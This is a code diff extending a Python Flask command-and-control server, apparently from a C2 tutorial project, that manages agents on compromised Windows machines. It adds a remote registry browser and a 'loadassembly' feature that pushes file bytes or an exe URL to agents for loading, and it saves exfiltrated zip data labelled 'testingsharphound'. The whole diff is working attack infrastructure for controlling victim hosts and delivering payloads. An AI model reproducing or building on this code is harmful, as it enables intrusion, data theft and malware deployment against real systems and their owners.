@@ -22,13 +22,17 @@ CMD_INPUT = []
 FILE_INPUT = []
 CMD_OUTPUT = []
 FILE_OUTPUT=[]
+REG_INPUT=[]
+REG_OUTPUT=[]
 IPS = []
 CWD=[]
 BUFFER_SIZE = 4096*10
 TO_DOWNLOAD=[]
 CURRENT_WORKING_DIR = "D:\\python\\c2_yt"
 GOT_OUTPUT = 0
-
+CURRENT_REGISTRY_PATH = []
+LOAD_INPUT=[]
+LOAD_OUTPUT=[]
 
 for i in range(50):
     #THREADS.append('')
@@ -39,6 +43,11 @@ for i in range(50):
     IPS.append('')
     CWD.append('.')
     TO_DOWNLOAD.append('')
+    REG_INPUT.append('')
+    REG_OUTPUT.append('')
+    CURRENT_REGISTRY_PATH.append('')
+    LOAD_INPUT.append('')
+    LOAD_OUTPUT.append('')
 
 app = Flask(__name__)
 
@@ -67,7 +76,7 @@ def handle_connection(connection,address,thread_index):
             #msg = connection.recv(BUFFER_SIZE).decode()
         CMD_OUTPUT[thread_index] = msg
         while True:
-            if CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='' or TO_DOWNLOAD[thread_index]!='':
+            if LOAD_INPUT[thread_index]!='' or CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='' or TO_DOWNLOAD[thread_index]!='' or REG_INPUT[thread_index]!='':
 
                 if TO_DOWNLOAD[thread_index]!='':
                     # download-lengthoffiles
@@ -87,8 +96,36 @@ def handle_connection(connection,address,thread_index):
                     CMD_OUTPUT[thread_index]=msg
                     TO_DOWNLOAD[thread_index]=''
 
+                elif REG_INPUT[thread_index]!='':
+                    # getregistry-inputhere
+                    cmd = "getregistry-" + REG_INPUT[thread_index]
+                    connection.send(cmd.encode())
+                    REG_OUTPUT[thread_index] = connection.recv(BUFFER_SIZE*10).decode()
+                    REG_INPUT[thread_index]=""
 
+                elif LOAD_INPUT[thread_index]!='':
+                    if LOAD_INPUT[thread_index][0:9]=="loadfile-":
+                        #print(LOAD_INPUT[thread_index])
+                        # we need to send file contents in bytes
+                        cmd = LOAD_INPUT[thread_index]
+                        connection.send(cmd.encode())
+                        filepath = "output\\"+LOAD_INPUT[thread_index][9:]
+                        print(filepath)
+                        fd = open(filepath,'rb')
+                        filecontent = fd.read()
+                        fd.close()
+                        connection.send(filecontent)
+                        LOAD_OUTPUT[thread_index]=connection.recv(BUFFER_SIZE).decode()
+                        LOAD_INPUT[thread_index]=''
+                    elif LOAD_INPUT[thread_index][0:8]=="loadurl-":
+                        # we need to send url of exe
+                        print(LOAD_INPUT[thread_index])
+                        cmd = LOAD_INPUT[thread_index]
+                        connection.send(cmd.encode())
+                        LOAD_OUTPUT[thread_index]=connection.recv(BUFFER_SIZE).decode()
+                        LOAD_INPUT[thread_index]=''
 
+                
                 elif FILE_INPUT[thread_index]!='':
                     # getdirectorycontents-directoryname
                     msg = "getdirectorycontents-"+FILE_INPUT[thread_index]
@@ -153,14 +190,15 @@ def handle_connection(connection,address,thread_index):
                     #print(str(contents))
                     #connection.settimeout(None)
                     #print(len(contents))
-                    filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+                    #filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+                    filename = "testingsharphound"
                     fd = open(".\\"+filename+".zip",'wb')
                     fd.write(contents)
                     fd.close()
                     #zf = zipfile.ZipFile(filename+".zip",'w')
                     #zf.wrirtestr(filename+".zip",contents)
                     #zf.close()
-                    time.sleep(3)
+                    #time.sleep(3)
                     contents2= connection.recv(BUFFER_SIZE)
                     #CMD_OUTPUT[thread_index]='File Transferred successfully'
                     CMD_INPUT[thread_index]=''
@@ -412,6 +450,79 @@ def downloadfiles(agentname):
     for i in range(len(fileoutput)):
         fileoutput[i]=list(fileoutput[i].split("->"))
     return render_template("filemanager.html",cwd=CWD[req_index],agentname=agentname,fileoutput=fileoutput)
+
+
+@app.route("/<agentname>/registrymanager",methods=["GET","POST"])
+def registrymanager(agentname):
+    for i in THREADS:
+        if agentname in i.name:
+            req_index = THREADS.index(i)
+    hives = ["HKCR","HKCU","HKLM","HKUSERS","HKCURRENT_CONFIG"]
+    cmdoutput = hives
+    if request.args.get("d"):
+        regkey = request.args.get("d")
+        print(regkey)
+        CURRENT_REGISTRY_PATH[req_index] +="\\"+ regkey
+        #CURRENT_REGISTRY_PATH[req_index]=CURRENT_REGISTRY_PATH[req_index][1:]
+        if CURRENT_REGISTRY_PATH[req_index][0]=="\\":
+            CURRENT_REGISTRY_PATH[req_index] = CURRENT_REGISTRY_PATH[req_index][1:]
+        REG_INPUT[req_index]=CURRENT_REGISTRY_PATH[req_index]
+        time.sleep(2)
+        cmdoutput = REG_OUTPUT[req_index]
+        print(cmdoutput)
+    if request.args.get("change"):
+        goingup =request.args.get("change")
+        print(goingup)
+        print(CURRENT_REGISTRY_PATH[req_index])
+        temp = CURRENT_REGISTRY_PATH[req_index].split("\\")
+        temppath = ""
+        for i in range(len(temp)):
+            if temp[i]==goingup:
+                temppath+=goingup
+                break
+                #temppath+=temp[i]+"\\"
+            else:
+                temppath+=temp[i]+"\\"    
+        if temppath=="" or temppath=="\\":
+            cmdoutput=hives
+        else:
+            if temppath[0]=="\\":
+                temppath = temppath[1:]
+            print(temppath)
+            CURRENT_REGISTRY_PATH[req_index]=temppath
+            REG_INPUT[req_index]=temppath
+            time.sleep(1)
+    if REG_OUTPUT[req_index]:
+        cmdoutput = REG_OUTPUT[req_index]
+        cmdoutput = cmdoutput.split("\n")
+        REG_OUTPUT[req_index]=""
+    if CURRENT_REGISTRY_PATH[req_index]=="":
+        path="\\"
+    else:
+        path = CURRENT_REGISTRY_PATH[req_index]
+    print(CURRENT_REGISTRY_PATH[req_index])
+    return render_template("registrymanager.html",cmdoutput=cmdoutput,agentname=agentname,path=path)
+
+
+
+@app.route("/<agentname>/loadassembly",methods=["GET","POST"])
+def loadassembly(agentname):
+    for i in THREADS:
+        if agentname in i.name:
+            req_index = THREADS.index(i)
+    if request.method=="POST":
+        #print(request.form.get("myfiles"))
+        if request.form.get("myfiles"):
+            filename = request.form.get("myfiles")
+            LOAD_INPUT[req_index] = "loadfile-"+filename
+        elif request.form.get("url"):
+            url = request.form.get("url")
+            LOAD_INPUT[req_index] = "loadurl-"+url
+    time.sleep(1)
+    cmdoutput = LOAD_OUTPUT[req_index]
+    return render_template('loadassembly.html',agentname=agentname)
+    
+
 
 
 if __name__=='__main__':
